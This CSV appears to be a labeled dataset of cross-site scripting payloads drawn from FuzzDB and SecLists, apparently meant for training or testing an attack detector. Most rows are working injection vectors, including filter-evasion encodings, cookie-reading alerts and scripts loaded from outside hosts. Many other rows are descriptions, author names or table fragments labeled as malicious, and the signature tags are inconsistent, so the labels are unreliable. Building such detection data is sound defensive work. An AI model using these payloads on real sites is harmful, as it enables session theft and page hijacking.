Payload,Signature,AttackType,Severity,MITRE,Label,Description
Firefox Lookups 3,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
onmouseleave,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<style>jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e</style>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"""><script>alert(""document.domain"")</script>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
Exploit Description: Basic injection attack,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Obfuscated onload attribute variant 2,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<svg><script onlypossibleinopera:-)> alert(1),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<script>/*jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e*/</script>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
&#x00003c,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
onafterupdate,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<audio src=x onerror=alert(""XSS"")>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
Exploit Description: This vector uses urlencoded hex entities to obfuscate the javascript: image source.,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Advanced HTML injection locator,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<audio src=x onerror=alert('1')>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
onbeforeunload,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
| `İ` (%c4%b0) | `toLowerCase()` | i |,CMDi,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
alert\u0028document.domain\u0029,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"<div id=""117""><a href=""http://attacker.org"">",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
Exploit Description: This very basic exploit works on surprisingly many pages - no real danger but bad image.,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<set attributeName=""xlink:href"" begin=""accessKey(c)"" to=""//example.com/?c"" />",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
onbeforeupdate,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
onorientationchange,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Mixed Encoding,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<script src=""https://js.rip/<custom.name>""></script>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
Basic JS breaker variant 5,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
JavaScript Link Location,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
' onmouseover=alert(/Black.Spook/),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Exploit Description: This vector creates an alert like message boy via Visual Basic Script,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<form><input formaction=javascript:alert(1) type=submit value=click>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"<iframe src=""http://example.org/""></iframe>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
XSS via VBScript MsgBox,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Author Name: t3rmin4t0r,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<keygen onfocus=confirm('XSS') autofocus>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
onvolumechange,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<SCRIPT/SRC=""http:&#47;&#47;xss.rocks/xss.js""></SCRIPT>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
&#000060;,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
&#x000003c,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Stylesheet,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<div id=""131""><b>drag and drop one of the following strings to the drop box:</b>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
al\u0065rt(1),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
&#x3c,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
onhashchange,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}},XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
<img src=x onerror=alert('XSS')>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
alert('instanceof'),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
<SCRIPT>a=/XSS/,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Hex Encoding,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<script>onerror=alert;throw 1337</script>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
<x contenteditable onkeydown=alert(1)>press any key!,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"<XSS STYLE=""xss:expression(alert('XSS'))"">",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
onstop,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Author Name: thespanner.co.uk,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<form onsubmit=alert(1)><input type=submit>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"<div id=""121""><html xmlns=""http://www.w3.org/1999/xhtml""",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"<iframe xmlns=""http://www.w3.org/1999/xhtml"" src=""javascript:alert(125)""></iframe>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
<script>prompt(document.cookie)</script>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
oncompassneedscalibration,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
| `ı` (%c4%b1) | `toUpperCase()` | I |,CMDi,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
javascript:alert%28/xss/%29,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<script>prompt('XSS')</script>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
<svg id=alert(1) onload=eval(id)>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
<select autofocus onfocus=alert(1)>,SQLi,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
ontransitionend,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"""><svg onload=alert(1)//",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"<A href=""",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
IMG Lowsrc,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<IMG SRC="" &#14;  javascript:alert('XSS');"">",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<svg:svg>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"foo=""""text </script>""",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
location,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Exploit Description: This vector creates a new body tag and utilizes semicolons and underscores to evade filters and produce an alert.,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Exploit Description: This vector writes an erroneous image tag with onerror hanlder inside an E4X construct into the document context.,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<SCRIPT a=`>` SRC=""http://xss.rocks/xss.js""></SCRIPT>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<iframe src=javascript:confirm('XSS')></iframe>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"<marquee onstart=alert(""XSS"")>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
onratechange,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
s>};function f() { 0[this.x](this.y) }f.call(o);,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
jAvascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
<input onfocus=confirm('XSS') autofocus>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
-(confirm)(document.domain)//,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"<html xmlns=""http://www.w3.org/1999/xhtml"">",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
Mocha,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
/((\%3D)|(=))[^\n]*((\%3C)|<)[^\n]+((\%3E)|>)/,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Exploit Description: JS literal object breaker for integer properties.,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<div id=""136""><form action="""" method=""post"">",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"<div id=""122""><iframe sandbox=""allow-same-origin allow-forms allow-scripts"" src=""http://example.org/""></iframe>//[""'`-->]]>]</div>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
<body ontouchstart=alert(1)> // Triggers when a finger touch the screen,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
onafterprint,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Exploit Description: VBscript in an image,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<div onmouseover=alert(""XSS"")>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
XML namespace,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<X onxxx=1,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
<marquee onstart=alert('document.domain')>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"<div id=""110""><svg xmlns=""http://www.w3.org/2000/svg"">",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
META,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<body onscroll=alert(1)><br><br><br><br>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
oncontrolselect,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
onstalled,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<XML SRC=""http:/xss.rocks/xsstest.xml"" ID=I></XML>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<x oncontextmenu=alert(1)>right click this!,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
IMG No Quotes/Semicolon,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
IMG w/VBscript,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
onresize,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"""><svg/onload=confirm(1)>""@x.y",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
onmove,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
alert(document.cookie);,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Self-contained XSS variant 6,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<details open ontoggle=alert('document.domain')>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"<TABLE BACKGROUND=""javascript:alert('XSS')"">",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Exploit Description: This vector creates a doubled new body tag and utilizes semicolons to evade filters and produce an alert.,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
alert(alt),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
| `\x1B $@` | JIS X 0208 1978 |,CMDi,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
<script>eval('\x61lert(\'33\')')</script>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
document.write(unescape(a..b)),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Exploit Description: This vector breaks double quoted attributes and produces an alert.,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<keygen/**/onfocus=alert('XSS')/**/autofocus>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"<!--jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e-->",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Exploit Description: Grave accent obfuscation (If you need to use both double and single quotes you can use a grave accent to encapsulate the JavaScript string - this is also useful because lots of cross site scripting filters don't know about grave accents).,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Firefox Lookups 2,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Exploit Description: This vector utilizes backslashes to exploit a parsing error in gecko based browsers and injects a remote XBL. Furthermore unclosed NBSP entities are used to obfuscate the string.,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<br><br><br><br><br><br><x id=x>#x,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
onsubmit,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<IMG SRC=""jav	ascript:alert('XSS');"">",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert('XSS');"">",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<meter onmouseover=alert(""XSS"")>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
alert(2),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
Exploit Description: This very simple but effective vector uses the open method on the name property.,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<marquee onstart=alert(1)>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
var _ = document.createElement(\'script\');,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"<META HTTP-EQUIV=""Link"" Content=""<http://xss.rocks/xss.css>; REL=stylesheet"">",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
javascript:alert('XSS'),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
Author URL: http://sirdarckcat.net/,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<x onmousedown=alert(1)>click this!,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"</math>//[""'`-->]]>]</div>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
Self-contained XSS variant 7,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
onseeking,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
onmousedown,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<STYLE>@import'http://xss.rocks/xss.css';</STYLE>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<details open ontoggle=alert('1')>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
firefoxurl: uri exploit (UXSS),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
onwaiting,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Exploit Description: This vector uses the __parent__ property combined with with() to execute an alert.,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Evade Regex Filter 2,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<audio src=x onerror=javascript:alert('XSS')>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
<svg onload=alert('XSS')>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<META HTTP-EQUIV=""Link"" Content=""<javascript:alert('XSS')>; REL=stylesheet"">",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
